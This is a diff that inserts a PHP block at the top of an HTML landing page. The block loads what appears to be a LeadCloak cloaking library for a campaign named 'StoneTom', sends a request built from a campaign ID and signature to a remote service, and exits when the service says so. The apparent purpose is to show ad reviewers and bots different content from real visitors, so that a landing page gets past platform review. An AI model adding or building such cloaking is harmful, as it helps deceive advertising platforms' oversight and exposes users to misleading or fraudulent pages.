@@ -1,3 +1,35 @@
+<?php
+/**
+ * Campaign: StoneTom
+ * Created: 2022-01-31 14:23:09 UTC
+ */
+
+require 'leadcloak-169mslq4t3rr.php';
+
+// ---------------------------------------------------
+// Configuration
+
+// Set this to false if application is properly installed.
+$enableDebugging = false;
+
+// Set this to false if you won't want to log error messages
+$enableLogging = true;
+
+if ($enableDebugging) {
+	isApplicationReadyToRun();
+}
+
+$data = httpRequestMakePayload($campaignId, $campaignSignature);
+
+$response = httpRequestExec($data);
+
+$handler = httpHandleResponse($response, $enableLogging);
+
+if ($handler) {
+	exit();
+}
+
+?>
 <!DOCTYPE html>
 <html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 <meta http-equiv="x-ua-compatible" content="ie=edge">
